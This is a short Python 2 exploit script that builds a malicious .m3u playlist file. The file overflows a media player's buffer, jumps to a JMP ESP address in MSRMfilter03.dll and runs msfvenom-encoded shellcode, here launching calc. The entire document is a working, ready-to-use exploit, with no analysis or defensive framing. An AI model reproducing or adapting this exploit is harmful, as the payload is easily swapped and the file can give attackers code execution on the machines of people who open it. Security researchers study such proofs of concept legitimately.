 #!/usr/bin/python2

filename = "exploit.m3u"

#  msfvenom -p windows/exec CMD='calc' --platform windows -a x86 -f c -e x86/shikata_ga_nai

shellcode = (
"\xba\x6a\xeb\xa0\xc8\xdb\xc8\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x30\x31\x50\x13\x83\xe8\xfc\x03\x50\x65\x09\x55\x34\x91\x4f"
"\x96\xc5\x61\x30\x1e\x20\x50\x70\x44\x20\xc2\x40\x0e\x64\xee"
"\x2b\x42\x9d\x65\x59\x4b\x92\xce\xd4\xad\x9d\xcf\x45\x8d\xbc"
"\x53\x94\xc2\x1e\x6a\x57\x17\x5e\xab\x8a\xda\x32\x64\xc0\x49"
"\xa3\x01\x9c\x51\x48\x59\x30\xd2\xad\x29\x33\xf3\x63\x22\x6a"
"\xd3\x82\xe7\x06\x5a\x9d\xe4\x23\x14\x16\xde\xd8\xa7\xfe\x2f"
"\x20\x0b\x3f\x80\xd3\x55\x07\x26\x0c\x20\x71\x55\xb1\x33\x46"
"\x24\x6d\xb1\x5d\x8e\xe6\x61\xba\x2f\x2a\xf7\x49\x23\x87\x73"
"\x15\x27\x16\x57\x2d\x53\x93\x56\xe2\xd2\xe7\x7c\x26\xbf\xbc"
"\x1d\x7f\x65\x12\x21\x9f\xc6\xcb\x87\xeb\xea\x18\xba\xb1\x60"
"\xde\x48\xcc\xc6\xe0\x52\xcf\x76\x89\x63\x44\x19\xce\x7b\x8f"
"\x5e\x20\x36\x92\xf6\xa9\x9f\x46\x4b\xb4\x1f\xbd\x8f\xc1\xa3"
"\x34\x6f\x36\xbb\x3c\x6a\x72\x7b\xac\x06\xeb\xee\xd2\xb5\x0c"
"\x3b\xb1\x58\x9f\xa7\x36"
)

EIP = "A" * 26042
return_address = "\x58\xb0\x01\x10" # JMP ESP from MSRMfilter03.dll
extra = "D" * 4
nops_sled = "\x90" * 16
padding = "D" * (30000 - len(EIP) - 4 - 4 - 16 - len(shellcode))
int3 = "\xcc" 
buffer = EIP + return_address + extra + nops_sled + shellcode + padding

file = open(filename,"w")
file.write(buffer)
file.close()
